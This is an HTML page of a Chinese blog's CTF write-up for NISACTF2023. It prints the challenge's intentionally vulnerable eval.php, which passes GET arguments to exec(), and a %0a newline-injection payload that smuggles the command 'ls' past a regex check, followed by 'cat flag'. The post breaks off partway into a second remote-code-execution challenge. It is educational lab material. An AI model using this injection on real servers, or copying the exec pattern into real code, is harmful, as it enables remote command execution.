@@ -1,0 +1,609 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>NISACTF2023 WriteUp | 雲流のLowest World</title>
+    <meta name="author" content="C1oudfL0w0" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+    <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<!-- 引入jQuery-->
+<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
+<script src="/blog/js/jquery.min.js"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+    <!--flag{never_g0nna g1ve_you up}-->
+
+    <!-- 页面点击特效 -->
+    <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+    <!-- 浏览器标题 -->
+    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+    <!-- 动态背景 -->
+    
+
+    <!--文章目录-->
+    
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">2.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Online-Shell"><span class="toc-number">2.1.</span> <span class="toc-text">Online Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%9F%E4%BD%A0%E5%8F%8C%E6%8E%92%E7%BA%AF%E5%9D%90%E7%89%A2"><span class="toc-number">2.2.</span> <span class="toc-text">跟你双排纯坐牢</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-number">3.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#baigei"><span class="toc-number">3.1.</span> <span class="toc-text">baigei</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#REVERSE"><span class="toc-number">4.</span> <span class="toc-text">REVERSE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#eazy-reverse"><span class="toc-number">4.1.</span> <span class="toc-text">eazy reverse</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bassssse-64"><span class="toc-number">4.2.</span> <span class="toc-text">bassssse 64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#random-world"><span class="toc-number">4.3.</span> <span class="toc-text">random world</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">5.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#babyCrypto"><span class="toc-number">5.1.</span> <span class="toc-text">babyCrypto</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E8%8E%AB%E6%96%AF%E7%94%B5%E7%A0%81"><span class="toc-number">5.2.</span> <span class="toc-text">简单的莫斯电码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-number">6.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E9%97%A8%E9%A2%98"><span class="toc-number">6.1.</span> <span class="toc-text">开门题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#osint1"><span class="toc-number">6.2.</span> <span class="toc-text">osint1</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PPC"><span class="toc-number">7.</span> <span class="toc-text">PPC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#suuuuudo"><span class="toc-number">7.1.</span> <span class="toc-text">suuuuudo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#capabilities"><span class="toc-number">7.2.</span> <span class="toc-text">capabilities</span></a></li></ol></li></ol>
+    </div>
+  
+
+    <!--返回顶部-->
+    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+        <a title="返回顶部">↑</a>
+    </div>
+    <script src="/blog/js/totop.js"></script>
+
+    <div id="layout">
+        
+            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+            
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>NISACTF2023 WriteUp</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/4/16
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                CTF线上赛
+            </a>
+        </span>
+        
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">1.5k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">6分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><img src="/blog/2023/04/16/NISACTF2023-WriteUp/image-20230416222558392.png" alt="image-20230416222558392"></p>
+<p><del>没能进前十多少还是有点遗憾</del>，不过也无所谓了（</p>
+<p>这次校赛作为个人赛规模不大，也是趁此过了一下拿血的瘾（</p>
+<p>个人感觉web，misc和部分crypto都是属于常规比赛难度的，难度还是有的，re确实是随手ak的程度，pwn的话要是会用相关环境估计也能多打几题</p>
+<span id="more"></span>
+
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Online-Shell"><a href="#Online-Shell" class="headerlink" title="Online Shell"></a>Online Shell</h2><blockquote>
+<p>源码泄露</p>
+</blockquote>
+<blockquote>
+<p>RCE</p>
+</blockquote>
+<blockquote>
+<p>题目与<a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv13732139?spm_id_from=333.999.0.0">2021哔哩哔哩1024程序员节日第二弹：安全攻防挑战赛</a>差不多</p>
+</blockquote>
+<p>打开题目发现一个登录框</p>
+<p><img src="/blog/2023/04/16/NISACTF2023-WriteUp/image-20230415205846808.png" alt="image-20230415205846808"></p>
+<p>一开始以为是sql注入磨了半天没有进展，后来看了一眼题目名就去搜了一下，意外发现之前ISCTF也有一道题目名字相同的题，那题用到了<code>www.zip</code>进行源码泄露，没想到这题也适用（</p>
+<p>index.php（登录框部分，<del>原来username和password是直接蒙的吗</del>）</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Login Page<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
+		<span class="token selector">body</span> <span class="token punctuation">&#123;</span>
+			<span class="token property">font-family</span><span class="token punctuation">:</span> Arial<span class="token punctuation">,</span> sans-serif<span class="token punctuation">;</span>
+			<span class="token property">background-color</span><span class="token punctuation">:</span> #f2f2f2<span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+
+		<span class="token selector">.container</span> <span class="token punctuation">&#123;</span>
+			<span class="token property">background-color</span><span class="token punctuation">:</span> #ffffff<span class="token punctuation">;</span>
+			<span class="token property">border-radius</span><span class="token punctuation">:</span> 5px<span class="token punctuation">;</span>
+			<span class="token property">box-shadow</span><span class="token punctuation">:</span> 0px 0px 10px <span class="token function">rgba</span><span class="token punctuation">(</span>0<span class="token punctuation">,</span> 0<span class="token punctuation">,</span> 0<span class="token punctuation">,</span> 0.3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token property">padding</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>
+			<span class="token property">margin</span><span class="token punctuation">:</span> 50px auto<span class="token punctuation">;</span>
+			<span class="token property">max-width</span><span class="token punctuation">:</span> 400px<span class="token punctuation">;</span>
+			<span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+
+		<span class="token selector">h1</span> <span class="token punctuation">&#123;</span>
+			<span class="token property">font-size</span><span class="token punctuation">:</span> 24px<span class="token punctuation">;</span>
+			<span class="token property">margin-bottom</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+
+		<span class="token selector">input[type="text"], input[type="password"]</span> <span class="token punctuation">&#123;</span>
+			<span class="token property">padding</span><span class="token punctuation">:</span> 5px<span class="token punctuation">;</span>
+			<span class="token property">border</span><span class="token punctuation">:</span> 1px solid #ccc<span class="token punctuation">;</span>
+			<span class="token property">border-radius</span><span class="token punctuation">:</span> 3px<span class="token punctuation">;</span>
+			<span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>
+			<span class="token property">box-sizing</span><span class="token punctuation">:</span> border-box<span class="token punctuation">;</span>
+			<span class="token property">margin-bottom</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>
+			<span class="token property">font-size</span><span class="token punctuation">:</span> 16px<span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+
+		<span class="token selector">input[type="submit"]</span> <span class="token punctuation">&#123;</span>
+			<span class="token property">background-color</span><span class="token punctuation">:</span> #4CAF50<span class="token punctuation">;</span>
+			<span class="token property">color</span><span class="token punctuation">:</span> #ffffff<span class="token punctuation">;</span>
+			<span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>
+			<span class="token property">border</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
+			<span class="token property">border-radius</span><span class="token punctuation">:</span> 5px<span class="token punctuation">;</span>
+			<span class="token property">cursor</span><span class="token punctuation">:</span> pointer<span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+
+		<span class="token selector">input[type="submit"]:hover</span> <span class="token punctuation">&#123;</span>
+			<span class="token property">background-color</span><span class="token punctuation">:</span> #3e8e41<span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+
+		<span class="token selector">.error</span> <span class="token punctuation">&#123;</span>
+			<span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>
+			<span class="token property">margin-bottom</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+
+		<span class="token selector">.link</span> <span class="token punctuation">&#123;</span>
+			<span class="token property">color</span><span class="token punctuation">:</span> #1e90ff<span class="token punctuation">;</span>
+			<span class="token property">text-decoration</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+
+		<span class="token selector">.link:hover</span> <span class="token punctuation">&#123;</span>
+			<span class="token property">text-decoration</span><span class="token punctuation">:</span> underline<span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+	</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
+		<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+			<span class="token comment">// Code for login validation here</span>
+			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"submit"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+				<span class="token comment">// Check if the username and password are valid</span>
+				<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+				<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">==</span><span class="token string single-quoted-string">'admin'</span> <span class="token keyword">and</span> <span class="token variable">$password</span><span class="token operator">==</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"source in www.zip"</span><span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Login Failed"</span><span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span>
+
+			<span class="token punctuation">&#125;</span>
+		<span class="token delimiter important">?></span></span>
+		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Username<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>
+			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Password<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>
+			<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Login<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>eval.php</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token comment">/* 
+        wowo
+    */</span>
+    <span class="token variable">$args</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token operator">></span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"too many args"</span><span class="token punctuation">;</span>
+        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
+        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\w+$/'</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"invalid args"</span><span class="token operator">.</span><span class="token variable">$args</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
+            <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    
+    <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/bin/255 "</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$out</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>题目要求传入<code>args</code>数组长度不能超过3</p>
+<p>还需要绕过<code>/^\w+$/</code>(限定一个任意长字符串，全部由字母数字或下划线组成，前面中间后面都不能有空格、标点等非\w字符)</p>
+<p>最后使用<code>exec</code>进行命令执行，<code>implode</code>函数为命令执行提供所需的空格</p>
+<p><strong>思路</strong></p>
+<p>本题主要问题在于绕过正则，这里可以使用<code>%0a</code><a href="https://c1oudfl0w0.github.io/blog/2023/03/15/PHP%E7%89%B9%E6%80%A7/#%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E">换行解析漏洞</a>绕过，然后在下一个数组进行命令执行</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>xxx<span class="token operator">%</span><span class="token number">0</span>a<span class="token operator">&amp;</span>args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/04/16/NISACTF2023-WriteUp/1.png" alt="1"></p>
+<p>由此可以查看目录</p>
+<p><img src="/blog/2023/04/16/NISACTF2023-WriteUp/image-20230416212731862.png" alt="image-20230416212731862"></p>
+<p>直接<code>cat flag</code>获取</p>
+<h2 id="跟你双排纯坐牢"><a href="#跟你双排纯坐牢" class="headerlink" title="跟你双排纯坐牢"></a>跟你双排纯坐牢</h2><blockquote>
+<p>无参RCE</p>
+</blockquote>
+<p>先打开看看，发现一个页面(也是等会要进行RCE的页面)</p>
+<p><img src="/blog/2023/04/16/NISACTF2023-WriteUp/image-20230416212846675.png" alt="image-20230416212846675"></p>
+<p>crtl+u看看网页源码，发现一个注释和一个禁用右键的js(<del>这个好像没啥用</del>)</p>
+<p><img src="/blog/2023/04/16/NISACTF2023-WriteUp/image-20230416213135884.png" alt="image-20230416213135884"></p>
+<p>f12打开网络在响应头找到hint</p>
+<p><img src="/blog/2023/04/16/NISACTF2023-WriteUp/image-20230416213400748.png" alt="image-20230416213400748"></p>
+<p>访问&#x2F;spark.php并在html头找到hint</p>
+<p><img src="/blog/2023/04/16/NISACTF2023-WriteUp/image-20230416213531426.png" alt="image-20230416213531426"></p>
+<p>访问&#x2F;h111int.php</p>
+<p><img src="/blog/2023/04/16/NISACTF2023-WriteUp/image-20230416213614566.png" alt="image-20230416213614566"></p>
+<p>得知要传的是get请求，参数是<code>code</code>，题目类型是RCE</p>
